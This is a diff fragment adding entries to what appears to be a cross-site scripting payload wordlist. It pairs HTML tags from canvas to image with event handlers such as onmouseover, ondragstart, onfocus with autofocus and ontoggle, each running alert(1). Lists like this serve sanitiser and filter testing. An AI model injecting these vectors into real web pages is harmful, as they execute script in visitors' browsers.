+<canvas onkeypress=\"alert(1)\" contenteditable>test</canvas>
+<canvas onkeyup=\"alert(1)\" contenteditable>test</canvas>
+<canvas onmouseenter=\"alert(1)\">test</canvas>
+<canvas onmouseleave=\"alert(1)\">test</canvas>
+<canvas onmousemove=\"alert(1)\">test</canvas>
+<canvas onmouseout=\"alert(1)\">test</canvas>
+<canvas onpaste=\"alert(1)\" contenteditable>test</canvas>
+<caption draggable=\"true\" ondragend=\"alert(1)\">test</caption>
+<caption draggable=\"true\" ondragenter=\"alert(1)\">test</caption>
+<caption draggable=\"true\" ondragstart=\"alert(1)\">test</caption>
+<caption id=x tabindex=1 onbeforedeactivate=alert(1)></caption><input autofocus>
+<caption id=x tabindex=1 ondeactivate=alert(1)></caption><input id=y autofocus>
+<caption id=x tabindex=1 onfocusin=alert(1)></caption>
+<caption onbeforecopy=\"alert(1)\" contenteditable>test</caption>
+<caption onbeforecut=\"alert(1)\" contenteditable>test</caption>
+<caption onbeforepaste=\"alert(1)\" contenteditable>test</caption>
+<caption onblur=alert(1) tabindex=1 id=x></caption><input autofocus>
+<caption oncontextmenu=\"alert(1)\">test</caption>
+<caption onkeydown=\"alert(1)\" contenteditable>test</caption>
+<caption onkeypress=\"alert(1)\" contenteditable>test</caption>
+<caption onkeyup=\"alert(1)\" contenteditable>test</caption>
+<caption onmouseout=\"alert(1)\">test</caption>
+<caption onpaste=\"alert(1)\" contenteditable>test</caption>
+<center draggable=\"true\" ondragend=\"alert(1)\">test</center>
+<center draggable=\"true\" ondragenter=\"alert(1)\">test</center>
+<center draggable=\"true\" ondragleave=\"alert(1)\">test</center>
+<center id=x tabindex=1 onbeforeactivate=alert(1)></center>
+<center id=x tabindex=1 onbeforedeactivate=alert(1)></center><input autofocus>
+<center id=x tabindex=1 ondeactivate=alert(1)></center><input id=y autofocus>
+<center id=x tabindex=1 onfocus=alert(1)></center>
+<center onbeforecut=\"alert(1)\" contenteditable>test</center>
+<center onclick=\"alert(1)\">test</center>
+<center oncontextmenu=\"alert(1)\">test</center>
+<center oncopy=\"alert(1)\" contenteditable>test</center>
+<center ondblclick=\"alert(1)\">test</center>
+<center onfocusout=alert(1) tabindex=1 id=x></center><input autofocus>
+<center onkeydown=\"alert(1)\" contenteditable>test</center>
+<center onkeypress=\"alert(1)\" contenteditable>test</center>
+<center onmousedown=\"alert(1)\">test</center>
+<center onmouseenter=\"alert(1)\">test</center>
+<center onmouseleave=\"alert(1)\">test</center>
+<center onmousemove=\"alert(1)\">test</center>
+<center onmouseover=\"alert(1)\">test</center>
+<center onpaste=\"alert(1)\" contenteditable>test</center>
+<cite draggable=\"true\" ondrag=\"alert(1)\">test</cite>
+<cite draggable=\"true\" ondragend=\"alert(1)\">test</cite>
+<cite draggable=\"true\" ondragleave=\"alert(1)\">test</cite>
+<cite draggable=\"true\" ondragstart=\"alert(1)\">test</cite>
+<cite id=x tabindex=1 onbeforeactivate=alert(1)></cite>
+<cite id=x tabindex=1 ondeactivate=alert(1)></cite><input id=y autofocus>
+<cite id=x tabindex=1 onfocus=alert(1)></cite>
+<cite id=x tabindex=1 onfocusin=alert(1)></cite>
+<cite onbeforecopy=\"alert(1)\" contenteditable>test</cite>
+<cite onbeforecut=\"alert(1)\" contenteditable>test</cite>
+<cite onbeforepaste=\"alert(1)\" contenteditable>test</cite>
+<cite onblur=alert(1) tabindex=1 id=x></cite><input autofocus>
+<cite oncontextmenu=\"alert(1)\">test</cite>
+<cite oncopy=\"alert(1)\" contenteditable>test</cite>
+<cite oncut=\"alert(1)\" contenteditable>test</cite>
+<cite ondblclick=\"alert(1)\">test</cite>
+<cite onkeydown=\"alert(1)\" contenteditable>test</cite>
+<cite onmousedown=\"alert(1)\">test</cite>
+<cite onmouseout=\"alert(1)\">test</cite>
+<cite onpaste=\"alert(1)\" contenteditable>test</cite>
+<code draggable=\"true\" ondragenter=\"alert(1)\">test</code>
+<code id=x tabindex=1 onactivate=alert(1)></code>
+<code id=x tabindex=1 onbeforeactivate=alert(1)></code>
+<code id=x tabindex=1 onfocus=alert(1)></code>
+<code onbeforecut=\"alert(1)\" contenteditable>test</code>
+<code onclick=\"alert(1)\">test</code>
+<code oncut=\"alert(1)\" contenteditable>test</code>
+<code onkeypress=\"alert(1)\" contenteditable>test</code>
+<code onkeyup=\"alert(1)\" contenteditable>test</code>
+<code onmousedown=\"alert(1)\">test</code>
+<code onmouseleave=\"alert(1)\">test</code>
+<code onmouseout=\"alert(1)\">test</code>
+<code onmouseover=\"alert(1)\">test</code>
+<col draggable=\"true\" ondrag=\"alert(1)\">test</col>
+<col draggable=\"true\" ondragend=\"alert(1)\">test</col>
+<col draggable=\"true\" ondragenter=\"alert(1)\">test</col>
+<col draggable=\"true\" ondragstart=\"alert(1)\">test</col>
+<col id=x tabindex=1 onactivate=alert(1)></col>
+<col id=x tabindex=1 onbeforedeactivate=alert(1)></col><input autofocus>
+<col id=x tabindex=1 ondeactivate=alert(1)></col><input id=y autofocus>
+<col id=x tabindex=1 onfocus=alert(1)></col>
+<col id=x tabindex=1 onfocusin=alert(1)></col>
+<col onbeforecopy=\"alert(1)\" contenteditable>test</col>
+<col oncontextmenu=\"alert(1)\">test</col>
+<col ondblclick=\"alert(1)\">test</col>
+<col onkeypress=\"alert(1)\" contenteditable>test</col>
+<col onkeyup=\"alert(1)\" contenteditable>test</col>
+<col onmouseenter=\"alert(1)\">test</col>
+<col onmouseleave=\"alert(1)\">test</col>
+<col onmousemove=\"alert(1)\">test</col>
+<col onmouseout=\"alert(1)\">test</col>
+<col onmouseover=\"alert(1)\">test</col>
+<col onmouseup=\"alert(1)\">test</col>
+<col onpaste=\"alert(1)\" contenteditable>test</col>
+<colgroup draggable=\"true\" ondrag=\"alert(1)\">test</colgroup>
+<colgroup draggable=\"true\" ondragstart=\"alert(1)\">test</colgroup>
+<colgroup id=x tabindex=1 onactivate=alert(1)></colgroup>
+<colgroup id=x tabindex=1 onbeforedeactivate=alert(1)></colgroup><input autofocus>
+<colgroup onbeforecopy=\"alert(1)\" contenteditable>test</colgroup>
+<colgroup oncontextmenu=\"alert(1)\">test</colgroup>
+<colgroup onkeyup=\"alert(1)\" contenteditable>test</colgroup>
+<colgroup onmousedown=\"alert(1)\">test</colgroup>
+<colgroup onmouseenter=\"alert(1)\">test</colgroup>
+<colgroup onmousemove=\"alert(1)\">test</colgroup>
+<colgroup onmouseover=\"alert(1)\">test</colgroup>
+<command draggable=\"true\" ondrag=\"alert(1)\">test</command>
+<command draggable=\"true\" ondragend=\"alert(1)\">test</command>
+<command draggable=\"true\" ondragenter=\"alert(1)\">test</command>
+<command id=x tabindex=1 onbeforeactivate=alert(1)></command>
+<command id=x tabindex=1 ondeactivate=alert(1)></command><input id=y autofocus>
+<command id=x tabindex=1 onfocus=alert(1)></command>
+<command id=x tabindex=1 onfocusin=alert(1)></command>
+<command onbeforecopy=\"alert(1)\" contenteditable>test</command>
+<command onbeforecut=\"alert(1)\" contenteditable>test</command>
+<command onbeforepaste=\"alert(1)\" contenteditable>test</command>
+<command onclick=\"alert(1)\">test</command>
+<command oncopy=\"alert(1)\" contenteditable>test</command>
+<command ondblclick=\"alert(1)\">test</command>
+<command onfocusout=alert(1) tabindex=1 id=x></command><input autofocus>
+<command onkeydown=\"alert(1)\" contenteditable>test</command>
+<command onkeyup=\"alert(1)\" contenteditable>test</command>
+<command onmouseenter=\"alert(1)\">test</command>
+<command onmouseleave=\"alert(1)\">test</command>
+<command onmousemove=\"alert(1)\">test</command>
+<command onmouseover=\"alert(1)\">test</command>
+<command onmouseup=\"alert(1)\">test</command>
+<command onpaste=\"alert(1)\" contenteditable>test</command>
+<content draggable=\"true\" ondrag=\"alert(1)\">test</content>
+<content draggable=\"true\" ondragleave=\"alert(1)\">test</content>
+<content draggable=\"true\" ondragstart=\"alert(1)\">test</content>
+<content id=x tabindex=1 onbeforeactivate=alert(1)></content>
+<content onbeforepaste=\"alert(1)\" contenteditable>test</content>
+<content onblur=alert(1) tabindex=1 id=x></content><input autofocus>
+<content oncontextmenu=\"alert(1)\">test</content>
+<content oncopy=\"alert(1)\" contenteditable>test</content>
+<content oncut=\"alert(1)\" contenteditable>test</content>
+<content ondblclick=\"alert(1)\">test</content>
+<content onkeyup=\"alert(1)\" contenteditable>test</content>
+<content onmouseout=\"alert(1)\">test</content>
+<content onpaste=\"alert(1)\" contenteditable>test</content>
+<data draggable=\"true\" ondragleave=\"alert(1)\">test</data>
+<data draggable=\"true\" ondragstart=\"alert(1)\">test</data>
+<data id=x tabindex=1 onbeforeactivate=alert(1)></data>
+<data id=x tabindex=1 onbeforedeactivate=alert(1)></data><input autofocus>
+<data id=x tabindex=1 ondeactivate=alert(1)></data><input id=y autofocus>
+<data onbeforecut=\"alert(1)\" contenteditable>test</data>
+<data onbeforepaste=\"alert(1)\" contenteditable>test</data>
+<data onclick=\"alert(1)\">test</data>
+<data oncopy=\"alert(1)\" contenteditable>test</data>
+<data oncut=\"alert(1)\" contenteditable>test</data>
+<data onfocusout=alert(1) tabindex=1 id=x></data><input autofocus>
+<data onmousedown=\"alert(1)\">test</data>
+<data onmouseenter=\"alert(1)\">test</data>
+<data onmouseleave=\"alert(1)\">test</data>
+<data onmousemove=\"alert(1)\">test</data>
+<data onmouseup=\"alert(1)\">test</data>
+<data onpaste=\"alert(1)\" contenteditable>test</data>
+<datalist draggable=\"true\" ondrag=\"alert(1)\">test</datalist>
+<datalist draggable=\"true\" ondragend=\"alert(1)\">test</datalist>
+<datalist id=x tabindex=1 onbeforeactivate=alert(1)></datalist>
+<datalist id=x tabindex=1 onbeforedeactivate=alert(1)></datalist><input autofocus>
+<datalist id=x tabindex=1 ondeactivate=alert(1)></datalist><input id=y autofocus>
+<datalist id=x tabindex=1 onfocusin=alert(1)></datalist>
+<datalist oncontextmenu=\"alert(1)\">test</datalist>
+<datalist onfocusout=alert(1) tabindex=1 id=x></datalist><input autofocus>
+<datalist onmouseleave=\"alert(1)\">test</datalist>
+<datalist onmousemove=\"alert(1)\">test</datalist>
+<datalist onmouseout=\"alert(1)\">test</datalist>
+<dd draggable=\"true\" ondragleave=\"alert(1)\">test</dd>
+<dd draggable=\"true\" ondragstart=\"alert(1)\">test</dd>
+<dd id=x tabindex=1 onactivate=alert(1)></dd>
+<dd id=x tabindex=1 onbeforedeactivate=alert(1)></dd><input autofocus>
+<dd id=x tabindex=1 ondeactivate=alert(1)></dd><input id=y autofocus>
+<dd id=x tabindex=1 onfocus=alert(1)></dd>
+<dd id=x tabindex=1 onfocusin=alert(1)></dd>
+<dd onbeforepaste=\"alert(1)\" contenteditable>test</dd>
+<dd onclick=\"alert(1)\">test</dd>
+<dd oncontextmenu=\"alert(1)\">test</dd>
+<dd oncut=\"alert(1)\" contenteditable>test</dd>
+<dd ondblclick=\"alert(1)\">test</dd>
+<dd onfocusout=alert(1) tabindex=1 id=x></dd><input autofocus>
+<dd onkeypress=\"alert(1)\" contenteditable>test</dd>
+<dd onmousedown=\"alert(1)\">test</dd>
+<dd onmouseleave=\"alert(1)\">test</dd>
+<dd onmousemove=\"alert(1)\">test</dd>
+<dd onmouseout=\"alert(1)\">test</dd>
+<dd onmouseup=\"alert(1)\">test</dd>
+<dd onpaste=\"alert(1)\" contenteditable>test</dd>
+<del draggable=\"true\" ondrag=\"alert(1)\">test</del>
+<del draggable=\"true\" ondragend=\"alert(1)\">test</del>
+<del draggable=\"true\" ondragleave=\"alert(1)\">test</del>
+<del draggable=\"true\" ondragstart=\"alert(1)\">test</del>
+<del id=x tabindex=1 onbeforeactivate=alert(1)></del>
+<del id=x tabindex=1 onbeforedeactivate=alert(1)></del><input autofocus>
+<del id=x tabindex=1 onfocus=alert(1)></del>
+<del id=x tabindex=1 onfocusin=alert(1)></del>
+<del onbeforecopy=\"alert(1)\" contenteditable>test</del>
+<del onbeforecut=\"alert(1)\" contenteditable>test</del>
+<del onbeforepaste=\"alert(1)\" contenteditable>test</del>
+<del onblur=alert(1) tabindex=1 id=x></del><input autofocus>
+<del onclick=\"alert(1)\">test</del>
+<del oncontextmenu=\"alert(1)\">test</del>
+<del oncopy=\"alert(1)\" contenteditable>test</del>
+<del oncut=\"alert(1)\" contenteditable>test</del>
+<del ondblclick=\"alert(1)\">test</del>
+<del onfocusout=alert(1) tabindex=1 id=x></del><input autofocus>
+<del onkeydown=\"alert(1)\" contenteditable>test</del>
+<del onkeypress=\"alert(1)\" contenteditable>test</del>
+<del onkeyup=\"alert(1)\" contenteditable>test</del>
+<del onmousedown=\"alert(1)\">test</del>
+<del onmouseenter=\"alert(1)\">test</del>
+<del onmouseleave=\"alert(1)\">test</del>
+<del onmousemove=\"alert(1)\">test</del>
+<del onmouseout=\"alert(1)\">test</del>
+<del onmouseover=\"alert(1)\">test</del>
+<del onmouseup=\"alert(1)\">test</del>
+<del onpaste=\"alert(1)\" contenteditable>test</del>
+<details draggable=\"true\" ondragenter=\"alert(1)\">test</details>
+<details draggable=\"true\" ondragleave=\"alert(1)\">test</details>
+<details draggable=\"true\" ondragstart=\"alert(1)\">test</details>
+<details id=x tabindex=1 onactivate=alert(1)></details>
+<details id=x tabindex=1 ondeactivate=alert(1)></details><input id=y autofocus>
+<details onfocusout=alert(1) tabindex=1 id=x></details><input autofocus>
+<details onkeypress=\"alert(1)\" contenteditable>test</details>
+<details onmousedown=\"alert(1)\">test</details>
+<details onmouseleave=\"alert(1)\">test</details>
+<details onmouseout=\"alert(1)\">test</details>
+<details onmouseup=\"alert(1)\">test</details>
+<details onpaste=\"alert(1)\" contenteditable>test</details>
+<details ontoggle=alert(1) open>test</details>
+<dfn draggable=\"true\" ondragenter=\"alert(1)\">test</dfn>
+<dfn draggable=\"true\" ondragleave=\"alert(1)\">test</dfn>
+<dfn id=x tabindex=1 onbeforeactivate=alert(1)></dfn>
+<dfn id=x tabindex=1 onbeforedeactivate=alert(1)></dfn><input autofocus>
+<dfn id=x tabindex=1 onfocus=alert(1)></dfn>
+<dfn oncontextmenu=\"alert(1)\">test</dfn>
+<dfn oncut=\"alert(1)\" contenteditable>test</dfn>
+<dfn onkeydown=\"alert(1)\" contenteditable>test</dfn>
+<dfn onmousemove=\"alert(1)\">test</dfn>
+<dfn onmouseup=\"alert(1)\">test</dfn>
+<dialog draggable=\"true\" ondragend=\"alert(1)\">test</dialog>
+<dialog draggable=\"true\" ondragleave=\"alert(1)\">test</dialog>
+<dialog draggable=\"true\" ondragstart=\"alert(1)\">test</dialog>
+<dialog id=x tabindex=1 onactivate=alert(1)></dialog>
+<dialog id=x tabindex=1 onbeforeactivate=alert(1)></dialog>
+<dialog id=x tabindex=1 ondeactivate=alert(1)></dialog><input id=y autofocus>
+<dialog id=x tabindex=1 onfocus=alert(1)></dialog>
+<dialog id=x tabindex=1 onfocusin=alert(1)></dialog>
+<dialog onbeforecopy=\"alert(1)\" contenteditable>test</dialog>
+<dialog onbeforepaste=\"alert(1)\" contenteditable>test</dialog>
+<dialog onblur=alert(1) tabindex=1 id=x></dialog><input autofocus>
+<dialog ondblclick=\"alert(1)\">test</dialog>
+<dialog onfocusout=alert(1) tabindex=1 id=x></dialog><input autofocus>
+<dialog onkeydown=\"alert(1)\" contenteditable>test</dialog>
+<dialog onmouseover=\"alert(1)\">test</dialog>
+<dialog onmouseup=\"alert(1)\">test</dialog>
+<dir onmouseenter=\"alert(1)\">test</dir>
+<div draggable=\"true\" contenteditable>drag me</div><b ondragover=alert(1) contenteditable>drop here</b>
+<div draggable=\"true\" contenteditable>drag me</div><base ondrop=alert(1) contenteditable>drop here</base>
+<div draggable=\"true\" contenteditable>drag me</div><basefont ondragover=alert(1) contenteditable>drop here</basefont>
+<div draggable=\"true\" contenteditable>drag me</div><basefont ondrop=alert(1) contenteditable>drop here</basefont>
+<div draggable=\"true\" contenteditable>drag me</div><bdi ondragover=alert(1) contenteditable>drop here</bdi>
+<div draggable=\"true\" contenteditable>drag me</div><bdi ondrop=alert(1) contenteditable>drop here</bdi>
+<div draggable=\"true\" contenteditable>drag me</div><bdo ondragover=alert(1) contenteditable>drop here</bdo>
+<div draggable=\"true\" contenteditable>drag me</div><br ondrop=alert(1) contenteditable>drop here</br>
+<div draggable=\"true\" contenteditable>drag me</div><button ondragover=alert(1) contenteditable>drop here</button>
+<div draggable=\"true\" contenteditable>drag me</div><canvas ondrop=alert(1) contenteditable>drop here</canvas>
+<div draggable=\"true\" contenteditable>drag me</div><caption ondragover=alert(1) contenteditable>drop here</caption>
+<div draggable=\"true\" contenteditable>drag me</div><caption ondrop=alert(1) contenteditable>drop here</caption>
+<div draggable=\"true\" contenteditable>drag me</div><center ondragover=alert(1) contenteditable>drop here</center>
+<div draggable=\"true\" contenteditable>drag me</div><center ondrop=alert(1) contenteditable>drop here</center>
+<div draggable=\"true\" contenteditable>drag me</div><code ondragover=alert(1) contenteditable>drop here</code>
+<div draggable=\"true\" contenteditable>drag me</div><code ondrop=alert(1) contenteditable>drop here</code>
+<div draggable=\"true\" contenteditable>drag me</div><col ondrop=alert(1) contenteditable>drop here</col>
+<div draggable=\"true\" contenteditable>drag me</div><content ondrop=alert(1) contenteditable>drop here</content>
+<div draggable=\"true\" contenteditable>drag me</div><data ondragover=alert(1) contenteditable>drop here</data>
+<div draggable=\"true\" contenteditable>drag me</div><frame ondragover=alert(1) contenteditable>drop here</frame>
+<div draggable=\"true\" contenteditable>drag me</div><head ondragover=alert(1) contenteditable>drop here</head>
+<div draggable=\"true\" contenteditable>drag me</div><header ondragover=alert(1) contenteditable>drop here</header>
+<div draggable=\"true\" contenteditable>drag me</div><i ondrop=alert(1) contenteditable>drop here</i>
+<div draggable=\"true\" contenteditable>drag me</div><iframe ondrop=alert(1) contenteditable>drop here</iframe>
+<div draggable=\"true\" contenteditable>drag me</div><img ondragover=alert(1) contenteditable>drop here</img>
+<div draggable=\"true\" contenteditable>drag me</div><ins ondrop=alert(1) contenteditable>drop here</ins>
+<div draggable=\"true\" contenteditable>drag me</div><isindex ondragover=alert(1) contenteditable>drop here</isindex>
+<div draggable=\"true\" contenteditable>drag me</div><isindex ondrop=alert(1) contenteditable>drop here</isindex>
+<div draggable=\"true\" contenteditable>drag me</div><kbd ondragover=alert(1) contenteditable>drop here</kbd>
+<div draggable=\"true\" contenteditable>drag me</div><legend ondragover=alert(1) contenteditable>drop here</legend>
+<div draggable=\"true\" contenteditable>drag me</div><legend ondrop=alert(1) contenteditable>drop here</legend>
+<div draggable=\"true\" contenteditable>drag me</div><link ondrop=alert(1) contenteditable>drop here</link>
+<div draggable=\"true\" contenteditable>drag me</div><listing ondragover=alert(1) contenteditable>drop here</listing>
+<div draggable=\"true\" contenteditable>drag me</div><main ondragover=alert(1) contenteditable>drop here</main>
+<div draggable=\"true\" contenteditable>drag me</div><marquee ondragover=alert(1) contenteditable>drop here</marquee>
+<div draggable=\"true\" contenteditable>drag me</div><marquee ondrop=alert(1) contenteditable>drop here</marquee>
+<div draggable=\"true\" contenteditable>drag me</div><menuitem ondrop=alert(1) contenteditable>drop here</menuitem>
+<div draggable=\"true\" contenteditable>drag me</div><meta ondragover=alert(1) contenteditable>drop here</meta>
+<div draggable=\"true\" contenteditable>drag me</div><meter ondrop=alert(1) contenteditable>drop here</meter>
+<div draggable=\"true\" contenteditable>drag me</div><ol ondragover=alert(1) contenteditable>drop here</ol>
+<div draggable=\"true\" contenteditable>drag me</div><output ondrop=alert(1) contenteditable>drop here</output>
+<div draggable=\"true\" contenteditable>drag me</div><rt ondrop=alert(1) contenteditable>drop here</rt>
+<div draggable=\"true\" contenteditable>drag me</div><select ondragover=alert(1) contenteditable>drop here</select>
+<div draggable=\"true\" contenteditable>drag me</div><select ondrop=alert(1) contenteditable>drop here</select>
+<div draggable=\"true\" contenteditable>drag me</div><small ondragover=alert(1) contenteditable>drop here</small>
+<div draggable=\"true\" contenteditable>drag me</div><small ondrop=alert(1) contenteditable>drop here</small>
+<div draggable=\"true\" contenteditable>drag me</div><strike ondrop=alert(1) contenteditable>drop here</strike>
+<div draggable=\"true\" contenteditable>drag me</div><strong ondragover=alert(1) contenteditable>drop here</strong>
+<div draggable=\"true\" contenteditable>drag me</div><strong ondrop=alert(1) contenteditable>drop here</strong>
+<div draggable=\"true\" contenteditable>drag me</div><style ondragover=alert(1) contenteditable>drop here</style>
+<div draggable=\"true\" contenteditable>drag me</div><style ondrop=alert(1) contenteditable>drop here</style>
+<div draggable=\"true\" contenteditable>drag me</div><sub ondragover=alert(1) contenteditable>drop here</sub>
+<div draggable=\"true\" contenteditable>drag me</div><sub ondrop=alert(1) contenteditable>drop here</sub>
+<div draggable=\"true\" contenteditable>drag me</div><summary ondragover=alert(1) contenteditable>drop here</summary>
+<div draggable=\"true\" contenteditable>drag me</div><svg ondrop=alert(1) contenteditable>drop here</svg>
+<div draggable=\"true\" contenteditable>drag me</div><time ondragover=alert(1) contenteditable>drop here</time>
+<div draggable=\"true\" contenteditable>drag me</div><time ondrop=alert(1) contenteditable>drop here</time>
+<div draggable=\"true\" contenteditable>drag me</div><title ondragover=alert(1) contenteditable>drop here</title>
+<div draggable=\"true\" contenteditable>drag me</div><title ondrop=alert(1) contenteditable>drop here</title>
+<div draggable=\"true\" contenteditable>drag me</div><xmp ondrop=alert(1) contenteditable>drop here</xmp>
+<div onkeyup=\"alert(1)\" contenteditable>test</div>
+<div onmousedown=\"alert(1)\">test</div>
+<div onmouseover=\"alert(1)\">test</div>
+<dl draggable=\"true\" ondragstart=\"alert(1)\">test</dl>
+<dl id=x tabindex=1 onbeforeactivate=alert(1)></dl>
+<dl id=x tabindex=1 onbeforedeactivate=alert(1)></dl><input autofocus>
+<dl id=x tabindex=1 ondeactivate=alert(1)></dl><input id=y autofocus>
+<dl onbeforecut=\"alert(1)\" contenteditable>test</dl>
+<dl onbeforepaste=\"alert(1)\" contenteditable>test</dl>
+<dl onblur=alert(1) tabindex=1 id=x></dl><input autofocus>
+<dl onmouseenter=\"alert(1)\">test</dl>
+<dl onmousemove=\"alert(1)\">test</dl>
+<dl onmouseout=\"alert(1)\">test</dl>
+<dl onmouseup=\"alert(1)\">test</dl>
+<dl onpaste=\"alert(1)\" contenteditable>test</dl>
+<dt oncontextmenu=\"alert(1)\">test</dt>
+<dt ondblclick=\"alert(1)\">test</dt>
+<element id=x tabindex=1 ondeactivate=alert(1)></element><input id=y autofocus>
+<element id=x tabindex=1 onfocusin=alert(1)></element>
+<element onfocusout=alert(1) tabindex=1 id=x></element><input autofocus>
+<element onmouseenter=\"alert(1)\">test</element>
+<element onmouseup=\"alert(1)\">test</element>
+<em draggable=\"true\" ondragleave=\"alert(1)\">test</em>
+<em id=x tabindex=1 onbeforeactivate=alert(1)></em>
+<em id=x tabindex=1 ondeactivate=alert(1)></em><input id=y autofocus>
+<em id=x tabindex=1 onfocus=alert(1)></em>
+<em onbeforecut=\"alert(1)\" contenteditable>test</em>
+<em onbeforepaste=\"alert(1)\" contenteditable>test</em>
+<em onclick=\"alert(1)\">test</em>
+<em onmouseover=\"alert(1)\">test</em>
+<em onmouseup=\"alert(1)\">test</em>
+<embed draggable=\"true\" ondragleave=\"alert(1)\">test</embed>
+<embed draggable=\"true\" ondragstart=\"alert(1)\">test</embed>
+<embed onmousedown=\"alert(1)\">test</embed>
+<embed onmousemove=\"alert(1)\">test</embed>
+<embed onmouseout=\"alert(1)\">test</embed>
+<embed onmouseover=\"alert(1)\">test</embed>
+<fieldset oncopy=\"alert(1)\" contenteditable>test</fieldset>
+<fieldset onkeypress=\"alert(1)\" contenteditable>test</fieldset>
+<fieldset onmousedown=\"alert(1)\">test</fieldset>
+<fieldset onpaste=\"alert(1)\" contenteditable>test</fieldset>
+<figcaption draggable=\"true\" ondragenter=\"alert(1)\">test</figcaption>
+<figcaption draggable=\"true\" ondragleave=\"alert(1)\">test</figcaption>
+<figcaption onbeforecopy=\"alert(1)\" contenteditable>test</figcaption>
+<figcaption oncut=\"alert(1)\" contenteditable>test</figcaption>
+<figcaption ondblclick=\"alert(1)\">test</figcaption>
+<figcaption onfocusout=alert(1) tabindex=1 id=x></figcaption><input autofocus>
+<figcaption onmousedown=\"alert(1)\">test</figcaption>
+<figcaption onmouseover=\"alert(1)\">test</figcaption>
+<figure id=x tabindex=1 onfocusin=alert(1)></figure>
+<figure onbeforecopy=\"alert(1)\" contenteditable>test</figure>
+<figure onpaste=\"alert(1)\" contenteditable>test</figure>
+<font draggable=\"true\" ondragend=\"alert(1)\">test</font>
+<font draggable=\"true\" ondragenter=\"alert(1)\">test</font>
+<font draggable=\"true\" ondragstart=\"alert(1)\">test</font>
+<font id=x tabindex=1 onbeforeactivate=alert(1)></font>
+<font id=x tabindex=1 onfocus=alert(1)></font>
+<font oncopy=\"alert(1)\" contenteditable>test</font>
+<font onmouseenter=\"alert(1)\">test</font>
+<font onmouseup=\"alert(1)\">test</font>
+<font onpaste=\"alert(1)\" contenteditable>test</font>
+<footer draggable=\"true\" ondragend=\"alert(1)\">test</footer>
+<footer id=x tabindex=1 ondeactivate=alert(1)></footer><input id=y autofocus>
+<footer id=x tabindex=1 onfocusin=alert(1)></footer>
+<footer onmouseout=\"alert(1)\">test</footer>
+<form draggable=\"true\" ondrag=\"alert(1)\">test</form>
+<form draggable=\"true\" ondragend=\"alert(1)\">test</form>
+<form id=x tabindex=1 onbeforedeactivate=alert(1)></form><input autofocus>
+<form ondblclick=\"alert(1)\">test</form>
+<form onfocusout=alert(1) tabindex=1 id=x></form><input autofocus>
+<form onkeydown=\"alert(1)\" contenteditable>test</form>
+<frame draggable=\"true\" ondragleave=\"alert(1)\">test</frame>
+<frame id=x tabindex=1 onbeforeactivate=alert(1)></frame>
+<frame onbeforecopy=\"alert(1)\" contenteditable>test</frame>
+<frame onbeforecut=\"alert(1)\" contenteditable>test</frame>
+<frame oncontextmenu=\"alert(1)\">test</frame>
+<frame onkeyup=\"alert(1)\" contenteditable>test</frame>
+<frame onmouseenter=\"alert(1)\">test</frame>
+<frame onmouseleave=\"alert(1)\">test</frame>
+<frame onmouseover=\"alert(1)\">test</frame>
+<frameset draggable=\"true\" ondragstart=\"alert(1)\">test</frameset>
+<frameset id=x tabindex=1 onactivate=alert(1)></frameset>
+<frameset oncontextmenu=\"alert(1)\">test</frameset>
+<frameset><frame onload=alert(1)>
+<h1 draggable=\"true\" ondragend=\"alert(1)\">test</h1>
+<h1 draggable=\"true\" ondragstart=\"alert(1)\">test</h1>
+<h1 id=x tabindex=1 onbeforeactivate=alert(1)></h1>
+<h1 oncontextmenu=\"alert(1)\">test</h1>
+<h1 onkeypress=\"alert(1)\" contenteditable>test</h1>
+<h1 onmouseleave=\"alert(1)\">test</h1>
+<head draggable=\"true\" ondragenter=\"alert(1)\">test</head>
+<head id=x tabindex=1 onfocusin=alert(1)></head>
+<head onbeforepaste=\"alert(1)\" contenteditable>test</head>
+<head oncontextmenu=\"alert(1)\">test</head>
+<head oncopy=\"alert(1)\" contenteditable>test</head>
+<head oncut=\"alert(1)\" contenteditable>test</head>
+<head ondblclick=\"alert(1)\">test</head>
+<head onkeydown=\"alert(1)\" contenteditable>test</head>
+<head onmouseleave=\"alert(1)\">test</head>
+<header draggable=\"true\" ondragenter=\"alert(1)\">test</header>
+<header onfocusout=alert(1) tabindex=1 id=x></header><input autofocus>
+<hgroup draggable=\"true\" ondragenter=\"alert(1)\">test</hgroup>
+<hgroup draggable=\"true\" ondragstart=\"alert(1)\">test</hgroup>
+<hgroup id=x tabindex=1 ondeactivate=alert(1)></hgroup><input id=y autofocus>
+<hgroup id=x tabindex=1 onfocus=alert(1)></hgroup>
+<hgroup onmouseenter=\"alert(1)\">test</hgroup>
+<hgroup onmouseup=\"alert(1)\">test</hgroup>
+<hr draggable=\"true\" ondragend=\"alert(1)\">test</hr>
+<hr draggable=\"true\" ondragenter=\"alert(1)\">test</hr>
+<hr id=x tabindex=1 ondeactivate=alert(1)></hr><input id=y autofocus>
+<hr onbeforecut=\"alert(1)\" contenteditable>test</hr>
+<hr onbeforepaste=\"alert(1)\" contenteditable>test</hr>
+<hr onblur=alert(1) tabindex=1 id=x></hr><input autofocus>
+<hr onfocusout=alert(1) tabindex=1 id=x></hr><input autofocus>
+<hr onkeydown=\"alert(1)\" contenteditable>test</hr>
+<hr onkeypress=\"alert(1)\" contenteditable>test</hr>
+<hr onmouseenter=\"alert(1)\">test</hr>
+<hr onmouseleave=\"alert(1)\">test</hr>
+<html onbeforecut=\"alert(1)\" contenteditable>test</html>
+<html oncontextmenu=\"alert(1)\">test</html>
+<i id=x tabindex=1 onactivate=alert(1)></i>
+<i onclick=\"alert(1)\">test</i>
+<i oncontextmenu=\"alert(1)\">test</i>
+<i onfocusout=alert(1) tabindex=1 id=x></i><input autofocus>
+<i onmouseout=\"alert(1)\">test</i>
+<iframe draggable=\"true\" ondragstart=\"alert(1)\">test</iframe>
+<iframe id=x onfocusin=alert(1)>
+<iframe id=x tabindex=1 onactivate=alert(1)></iframe>
+<iframe id=x tabindex=1 onbeforeactivate=alert(1)></iframe>
+<iframe id=x tabindex=1 onbeforedeactivate=alert(1)></iframe><input autofocus>
+<iframe id=x tabindex=1 ondeactivate=alert(1)></iframe><input id=y autofocus>
+<iframe onbeforecopy=\"alert(1)\" contenteditable>test</iframe>
+<iframe onblur=alert(1) id=x><input autofocus>
+<iframe onfocusout=alert(1) id=x><input autofocus>
+<iframe onmouseover=\"alert(1)\">test</iframe>
+<iframe onpaste=\"alert(1)\" contenteditable>test</iframe>
+<iframe onreadystatechange=alert(1)></iframe>
+<image draggable=\"true\" ondrag=\"alert(1)\">test</image>
+<image draggable=\"true\" ondragend=\"alert(1)\">test</image>
+<image draggable=\"true\" ondragenter=\"alert(1)\">test</image>
